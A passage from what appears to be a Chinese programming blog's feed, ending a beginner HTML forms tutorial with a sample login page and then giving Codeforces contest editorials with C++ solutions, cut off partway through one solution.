标签上所有的用户输入提交到后端去。只是我们没有在后端写脚本响应这些数据，因此我们自己尝试的话点击通常是无效的。</p><p>常用的控件有以下几种</p><ul><li><code>text</code>：普通文本框</li><li><code>password</code>：密码框，与文本框一样只是输入内容会被和谐</li><li><code>textarea</code>：多行文本框</li><li><code>submit</code>：提交按钮</li><li><code>radio</code>：单选框</li><li><code>checkbox</code>：复选框</li><li><code>select</code>：下拉框</li></ul><p>这个我们不一一讲解了，直接一起聚合起来试试吧。</p><p>我们复刻一个最基本的登录前端</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">form</span>&gt;</span></span><br><span class="line">                用户名<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span>/&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">                密码<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span>/&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">                身份：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">name</span>=<span class="string">&quot;id&quot;</span> <span class="attr">value</span>=<span class="string">&quot;user&quot;</span>/&gt;</span>管理员</span><br><span class="line">                <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">name</span>=<span class="string">&quot;id&quot;</span> <span class="attr">value</span>=<span class="string">&quot;admin&quot;</span>/&gt;</span>用户</span><br><span class="line">                <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">name</span>=<span class="string">&quot;id&quot;</span> <span class="attr">value</span>=<span class="string">&quot;guest&quot;</span>&gt;</span>游客<span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;login&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">name</span>=<span class="string">&quot;keep&quot;</span> <span class="attr">value</span>=<span class="string">&quot;remember&quot;</span>&gt;</span>记住密码</span><br><span class="line">            <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>效果如下：</p><p><img src="/2022/04/24/html%E8%AF%AD%E8%A8%80%E7%9A%84%E5%AD%A6%E4%B9%A0/12.png" alt="12"></p><p>可以发现 <code>input</code> 标签都设置了三个值，第一个我们说过了指定控件类型，第二个和第三个是什么呢。</p><p><code>name</code>其实就是参数名，这个<code>value</code>呢就是参数值了，<code>form</code> 标签有一个属性指定的是提交表单的方式，如果没有指定默认以 <code>get</code> 方式提交，<code>get</code> 方式我们很清楚一点就是数据在 <code>url</code> 中都是可以看到的的。那么我们随便输入点击提交看看会发生什么。</p><p><img src="/2022/04/24/html%E8%AF%AD%E8%A8%80%E7%9A%84%E5%AD%A6%E4%B9%A0/13.png" alt="13"></p><p>从 <code>url</code> 中也能很清楚的看到刚刚说的这一点，只是这种提交方式已经很少见了，大家也能看到，输入的数据基本就是明文传输的，现在网络安全也是国家高度重视的，稍微大一点的网站基本都是自己写提交方法然后然后 <code>js</code> 绑定控件去执行事件，这样就能在 <code>js</code> 里写加解密方法了。</p><p>就这么多吧，html学到这里差不多能弄清楚一点了。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;来学学 &lt;code&gt;html&lt;/code&gt; (超文本标记语言)。&lt;/p&gt;
&lt;p&gt;超文本标记语言)是一种用于创建网页的标准标记语言。&lt;/p&gt;</summary>
    
    
    
    <category term="ctf" scheme="http://example.com/categories/ctf/"/>
    
    <category term="web" scheme="http://example.com/categories/ctf/web/"/>
    
    <category term="html" scheme="http://example.com/categories/ctf/web/html/"/>
    
    
  </entry>
  
  <entry>
    <title>educational codeforces round 127(Div.2)</title>
    <link href="http://example.com/2022/04/23/Educational%20Coeforces%20Round%20127(Div.2)/"/>
    <id>http://example.com/2022/04/23/Educational%20Coeforces%20Round%20127(Div.2)/</id>
    <published>2022-04-23T15:00:00.000Z</published>
    <updated>2022-05-06T07:32:22.293Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://codeforces.com/contest/1671">Educational Codeforces Round 127 (Rated for Div. 2)</a>，咕了有点久了，现在开写题解。</p><span id="more"></span><h2 id="A-String-Building"><a href="#A-String-Building" class="headerlink" title="A. String Building"></a>A. String Building</h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="/2022/04/23/Educational%20Coeforces%20Round%20127(Div.2)/1.png" alt="1"></p><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>分析字符串是否能由aa,aaa,bb,bbb组成，给定字符串只含有a和b，很简单，就看看有没有单独存在的a或者b即可</p><h3 id="标程"><a href="#标程" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">char</span> s[<span class="number">100005</span>]; </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,s);</span><br><span class="line">    <span class="keyword">int</span> len=<span class="built_in">strlen</span>(s);</span><br><span class="line">    <span class="keyword">int</span> ans=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span>(len==<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;NO&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    &#125;</span><br><span class="line">    s[len++]=<span class="string">&#x27;c&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;len;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(s[i]==s[i<span class="number">-1</span>])&#123;</span><br><span class="line">            ans++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(ans==<span class="number">1</span>)&#123;</span><br><span class="line">                <span class="built_in">puts</span>(<span class="string">&quot;NO&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> ;</span><br><span class="line">            &#125;</span><br><span class="line">            ans=<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;YES&quot;</span>);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="B-Consecutive-Points-Segment"><a href="#B-Consecutive-Points-Segment" class="headerlink" title="B. Consecutive Points Segment"></a>B. Consecutive Points Segment</h2><h3 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="/2022/04/23/Educational%20Coeforces%20Round%20127(Div.2)/2.png" alt="2"></p><h3 id="题目分析-1"><a href="#题目分析-1" class="headerlink" title="题目分析"></a>题目分析</h3><p>在数轴上放若干个点，每个点可以左移或者右移一个单位，或者不移，判断最后所有点能否在整数集合内连续。只考虑最左边和最右边的点，不难发现，若能连续，则满足a[n]-a[1]=n-1，我们就看最外两个点能否达到这个约束。若左边点右移，右边点左移则可以使得间距缩小2，因此若原本距离超过了n+1则一定不行。</p><h3 id="标程-1"><a href="#标程-1" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> a[<span class="number">200005</span>]; </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        cin&gt;&gt;a[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//printf(&quot;%d %d\n&quot;,a[n]-a[1],n);</span></span><br><span class="line">    <span class="keyword">if</span>(a[n]-a[<span class="number">1</span>]&gt;n+<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;NO&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;YES&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="C-Dolce-Vita"><a href="#C-Dolce-Vita" class="headerlink" title="C. Dolce Vita"></a>C. Dolce Vita</h2><h3 id="题目描述-2"><a href="#题目描述-2" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="/2022/04/23/Educational%20Coeforces%20Round%20127(Div.2)/3.png" alt="3"></p><h3 id="题目分析-2"><a href="#题目分析-2" class="headerlink" title="题目分析"></a>题目分析</h3><p>这题很有意思。给你n个商店和每天 $k$ 枚金币，每个商店只每天卖一个糖果包，每天涨价一块。问经过很多天后你最多能买到多少，并且它告诉你了最后一定有一天你一个糖果包也买不了。</p><p>首先不难得出，我肯定要从最小的糖果开始买买到不能买为止才是最优的解。因此先排个序肯定没错，然后求出前缀和 $sum[i]$表示买 $i$ 个糖果的最小花费。这里因为天数不确定很可能要过超过 $10^9$ 天，因此我们不能从天数上循环，我们就推从能买 $i$ 个物品到 $i-1$ 个物品过了多少天，假设过了 $q$ 天，那么这几天的收益就是 $q*i$。</p><p>那么假设今天是x天，我能买j件物品，我们能持续买j件物品的天数就是 $ceil((double)(x-sum[j])/j-i)+!((x-sum[j])%j)$。推出表达式之后其实整个程序也就不难写了，先二分出第0天的位置然后往前一件一件数即可，最后不要忘了开 $long\ long$，可恶，没准我开了就蓝名了。</p><h3 id="标程-2"><a href="#标程-2" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> int long long</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> a[<span class="number">200005</span>];</span><br><span class="line"><span class="keyword">int</span> sum[<span class="number">200005</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n,x;</span><br><span class="line">    cin&gt;&gt;n&gt;&gt;x;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        cin&gt;&gt;a[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">sort</span>(a+<span class="number">1</span>,a+<span class="number">1</span>+n);</span><br><span class="line">    sum[<span class="number">0</span>]=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        sum[i]=sum[i<span class="number">-1</span>]+a[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> i=<span class="number">0</span>,ans=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> cnt=<span class="built_in">upper_bound</span>(sum,sum+<span class="number">1</span>+n,x)-sum<span class="number">-1</span>;</span><br><span class="line">    <span class="comment">//printf(&quot;I can choose %d pack\n&quot;,cnt);</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> j=cnt;j&gt;=<span class="number">1</span>;j--)&#123;</span><br><span class="line">        <span class="comment">//printf(&quot;today is %d-th day\n&quot;,i);</span></span><br><span class="line">        <span class="keyword">int</span> after= <span class="built_in">ceil</span>((<span class="keyword">double</span>)(x-sum[j])/j-i)+!((x-sum[j])%j);</span><br><span class="line">        i+=after;</span><br><span class="line">        <span class="comment">//printf(&quot;I can buy until %d\n&quot;,i);</span></span><br><span class="line">        ans+=j*after;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%lld\n&quot;</span>,ans);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="D-Insert-a-Progression"><a href="#D-Insert-a-Progression" class="headerlink" title="D. Insert a Progression"></a>D. Insert a Progression</h2><h3 id="题目描述-3"><a href="#题目描述-3" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="/2022/04/23/Educational%20Coeforces%20Round%20127(Div.2)/4.png" alt="4"></p><h3 id="题目分析-3"><a href="#题目分析-3" class="headerlink" title="题目分析"></a>题目分析</h3><p>在数列中插入x个数，使得 $\sum <em>{i=1}^{n+x-1}|a_i^{‘}-a</em>{i-1}^{‘}|$ 最小。不难发现如果我插入的数在两个数之间，那么插入这个数对结果没有影响。若数列的最小值和最大值包括的部分那些数插入中间对答案没有影响，若剩余其它数则插在两边，至于插在哪边可以min一下。</p><p>这里当时看错题目了，以为每个数之间只能插入一次吗，导致后面卡了很长时间。</p><h3 id="标程-3"><a href="#标程-3" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> int long long</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> a[<span class="number">200005</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n,x;</span><br><span class="line">    cin&gt;&gt;n&gt;&gt;x;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        cin&gt;&gt;a[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> max_x=a[<span class="number">1</span>],min_x=a[<span class="number">1</span>],ans=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">2</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        ans+=<span class="built_in">abs</span>(a[i]-a[i<span class="number">-1</span>]);</span><br><span class="line">        max_x=<span class="built_in">max</span>(max_x,a[i]);</span><br><span class="line">        min_x=<span class="built_in">min</span>(min_x,a[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    ans+=<span class="built_in">min</span>((min_x<span class="number">-1</span>)*<span class="number">2</span>,<span class="built_in">min</span>(<span class="built_in">abs</span>(a[<span class="number">1</span>]<span class="number">-1</span>),<span class="built_in">abs</span>(a[n]<span class="number">-1</span>)));</span><br><span class="line">    <span class="keyword">if</span>(x&gt;max_x)&#123;</span><br><span class="line">        ans+=<span class="built_in">min</span>((x-max_x)*<span class="number">2</span>,<span class="built_in">min</span>(<span class="built_in">abs</span>(x-a[<span class="number">1</span>]),<span class="built_in">abs</span>(x-a[n])));</span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;ans&lt;&lt;endl;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结果：</p><p><img src="/2022/04/23/Educational%20Coeforces%20Round%20127(Div.2)/5.png" alt="5"></p><p>1595分，加油上蓝！！！</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://codeforces.com/contest/1671&quot;&gt;Educational Codeforces Round 127 (Rated for Div. 2)&lt;/a&gt;，咕了有点久了，现在开写题解。&lt;/p&gt;</summary>
    
    
    
    <category term="icpc" scheme="http://example.com/categories/icpc/"/>
    
    <category term="codeforces" scheme="http://example.com/categories/icpc/codeforces/"/>
    
    <category term="思维" scheme="http://example.com/categories/icpc/codeforces/%E6%80%9D%E7%BB%B4/"/>
    
    
  </entry>
  
  <entry>
    <title>codeforces round 784(Div.4)解析</title>
    <link href="http://example.com/2022/04/22/Codeforces%20Round%20784(Div.4)/"/>
    <id>http://example.com/2022/04/22/Codeforces%20Round%20784(Div.4)/</id>
    <published>2022-04-21T16:35:00.000Z</published>
    <updated>2022-05-03T04:44:56.509Z</updated>
    
    <content type="html"><![CDATA[<p>今天来打个<a href="https://codeforces.com/contest/1669">div4</a>。</p><span id="more"></span><h2 id="A-Division"><a href="#A-Division" class="headerlink" title="A. Division?"></a>A. Division?</h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="/2022/04/22/Codeforces%20Round%20784(Div.4)/1.png" alt="1"></p><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>这应该是描述了 <code>cf</code> 四个层次比赛的最高积分要求，超过将 <code>unrated</code> 进行比赛。直接按他的要求把四个等级判断输出一下就好了。</p><h3 id="标程"><a href="#标程" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">char</span> a[<span class="number">50</span>][<span class="number">50</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    <span class="keyword">int</span> k=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(n&lt;=<span class="number">1399</span>)&#123;</span><br><span class="line">        k=<span class="number">4</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(n&lt;=<span class="number">1599</span>)&#123;</span><br><span class="line">        k=<span class="number">3</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(n&lt;=<span class="number">1899</span>)&#123;</span><br><span class="line">        k=<span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        k=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Division %d\n&quot;</span>,k);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="B-Triple"><a href="#B-Triple" class="headerlink" title="B. Triple"></a>B. Triple</h2><h3 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="/2022/04/22/Codeforces%20Round%20784(Div.4)/2.png" alt="2"></p><h3 id="题目分析-1"><a href="#题目分析-1" class="headerlink" title="题目分析"></a>题目分析</h3><p>随便输出一个出现过三次的数就好了，但是要注意出现之后不要马上结束，把剩下的输入读完。</p><h3 id="标程-1"><a href="#标程-1" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line">map&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt;ma;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span 